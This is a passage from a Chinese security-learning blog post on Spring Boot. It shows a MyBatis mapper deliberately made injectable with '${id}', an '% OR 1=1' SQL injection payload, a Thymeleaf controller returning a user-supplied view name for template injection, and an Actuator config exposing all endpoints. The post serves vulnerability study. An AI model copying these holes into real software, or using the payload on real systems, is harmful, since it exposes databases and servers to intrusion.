            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397409684200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397409684200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397409684200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.springbootmybatis.controller;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.example.springbootmybatis.entity.User;
</span></span><span class="line"><span class="cl">import com.example.springbootmybatis.mapper.UserMapper;
</span></span><span class="line"><span class="cl">import org.springframework.beans.factory.annotation.Autowired;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.GetMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RestController;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.util.List;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@RestController
</span></span><span class="line"><span class="cl">public class GetadminController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Autowired
</span></span><span class="line"><span class="cl">    private UserMapper UserMapper;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping( &#34;/getadmin&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; getadmindata() {
</span></span><span class="line"><span class="cl">        List&lt;User&gt; all= UserMapper.findAll();
</span></span><span class="line"><span class="cl">        return all;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping( &#34;/getid&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; getadminid() {
</span></span><span class="line"><span class="cl">        List&lt;User&gt; all= UserMapper.findID();
</span></span><span class="line"><span class="cl">        return all;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}// src/main/java/com/example/springbootmybatis/controller/GetadminController.java
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">package com.example.springbootmybatis.controller;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.example.springbootmybatis.entity.User;
</span></span><span class="line"><span class="cl">import com.example.springbootmybatis.mapper.UserMapper;
</span></span><span class="line"><span class="cl">import org.springframework.beans.factory.annotation.Autowired;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.GetMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RestController;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.util.List;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@RestController
</span></span><span class="line"><span class="cl">public class GetadminController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Autowired
</span></span><span class="line"><span class="cl">    private UserMapper UserMapper;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping( &#34;/getadmin&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; getadmindata() {
</span></span><span class="line"><span class="cl">        List&lt;User&gt; all= UserMapper.findAll();
</span></span><span class="line"><span class="cl">        return all;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping( &#34;/getid&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; getadminid() {
</span></span><span class="line"><span class="cl">        List&lt;User&gt; all= UserMapper.findID();
</span></span><span class="line"><span class="cl">        return all;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901136.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902826.png" style="max-width: 100%; height: auto;"></p>
<h3 id="sql注入">sql注入<a hidden class="anchor" aria-hidden="true" href="#sql注入">#</a></h3>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/2ha0yuk7on/p/16880528.html#tid-EekQNr">https://www.cnblogs.com/2ha0yuk7on/p/16880528.html#tid-EekQNr</a></p>
<p><a href="https://developer.aliyun.com/article/834013">https://developer.aliyun.com/article/834013</a></p>
<p>重写接口方法</p>
<div class="code-block-container" id="code-1769750397410794200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397410794200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397410794200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397410794200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397410794200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// UserMapper.java
</span></span><span class="line"><span class="cl">public interface UserMapper {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    // @Select(&#34;select * from admin&#34;)
</span></span><span class="line"><span class="cl">    @Select(&#34;select * from admin where id like &#39;%${id}%&#39;&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; findAll(Integer id);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Select(&#34;select * from admin where id=1&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; findID();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// GetadminController.java
</span></span><span class="line"><span class="cl">public class GetadminController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Autowired
</span></span><span class="line"><span class="cl">    private UserMapper UserMapper;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping( &#34;/getadmin&#34;)
</span></span><span class="line"><span class="cl">    // 注意：此处加上@RequestParam，无法成功注入
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; getadmindata(Integer id) {
</span></span><span class="line"><span class="cl">        List&lt;User&gt; all= UserMapper.findAll(id);
</span></span><span class="line"><span class="cl">        return all;
</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901572.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900683.png" style="max-width: 100%; height: auto;"></p>
<p>sql注入：</p>
<div class="code-block-container" id="code-1769750397411297900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397411297900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">sql</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397411297900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397411297900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397411297900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%${id}%&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">%</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900709.png" style="max-width: 100%; height: auto;"></p>
<h2 id="模板引擎-thymeleaf">模板引擎-Thymeleaf<a hidden class="anchor" aria-hidden="true" href="#模板引擎-thymeleaf">#</a></h2>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900931.png" style="max-width: 100%; height: auto;"></p>
<h3 id="不安全的模版版本">不安全的模版版本<a hidden class="anchor" aria-hidden="true" href="#不安全的模版版本">#</a></h3>
<p>日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题<br>
参考:<a href="https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg">https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg</a></p>
<h4 id="问题"><strong>问题：</strong><a hidden class="anchor" aria-hidden="true" href="#问题">#</a></h4>
<p>此处使用@Controller而非@RestController</p>
<p><a href="https://blog.csdn.net/qq_35221138/article/details/79661998">@RestController和@Controller的区别</a></p>
<div class="code-block-container" id="code-1769750397411821800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397411821800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397411821800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397411821800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397411821800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// src/main/java/com/example/thyremeafdemo/controller/ThyremeafController.java
</span></span><span class="line"><span class="cl">package com.example.thyremeafdemo.controller;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.sun.org.apache.xml.internal.serializer.AttributesImplSerializer;
</span></span><span class="line"><span class="cl">import org.springframework.stereotype.Controller;
</span></span><span class="line"><span class="cl">import org.springframework.ui.Model;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.GetMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RequestMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RestController;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//@RestController有ResponseBody index当做字符串显示操作
</span></span><span class="line"><span class="cl">//@Controller没有ResponseBody index当做资源文件去渲染
</span></span><span class="line"><span class="cl">@Controller
</span></span><span class="line"><span class="cl">public class ThyremeafController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping(&#34;/&#34;)
</span></span><span class="line"><span class="cl">    public String index(Model model){
</span></span><span class="line"><span class="cl">        model.addAttribute(&#34;data&#34;,&#34;Hello xd&#34;);
</span></span><span class="line"><span class="cl">        return &#34;index&#34;;
</span></span><span class="line"><span class="cl">        //没有模板返回字符串index
</span></span><span class="line"><span class="cl">        //有模板引用返回index.html
</span></span><span class="line"><span class="cl">        //index.html 在定义的目录下同名
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    @GetMapping(&#34;/test&#34;)
</span></span><span class="line"><span class="cl">    public String index(@RequestParam String lang){
</span></span><span class="line"><span class="cl">        return lang;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    @RequestMapping (value = &#34;/&#34;)
</span></span><span class="line"><span class="cl">    public String index(@RequestParam String lang) {
</span></span><span class="line"><span class="cl">        return lang; // lang=en index-en
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397411821800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397411821800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">html</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397411821800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397411821800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397411821800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--index.html--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns:th</span><span class="o">=</span><span class="s">&#34;http://www.thymeleaf.org&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Title<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">th:text</span><span class="o">=</span><span class="s">&#34;${data}&#34;</span><span class="p">&gt;</span>默认值<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>新版本没有此漏洞，需要修改版本复现</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901478.png" style="max-width: 100%; height: auto;"></p>
<h2 id="监控系统-actuator">监控系统-Actuator<a hidden class="anchor" aria-hidden="true" href="#监控系统-actuator">#</a></h2>
<h3 id="功能">功能：<a hidden class="anchor" aria-hidden="true" href="#功能">#</a></h3>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902909.png" style="max-width: 100%; height: auto;"></p>
<div class="code-block-container" id="code-1769750397412869000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397412869000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397412869000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397412869000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397412869000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// application.properties文件配置
</span></span><span class="line"><span class="cl">server.port=8083
</span></span><span class="line"><span class="cl">management.endpoints.web.exposure.include=*</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>服务端&amp;客户端</strong></p>
<div class="code-block-container" id="code-1769750397412869000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397412869000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397412869000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397412869000" aria-label="展开或折叠代码块">
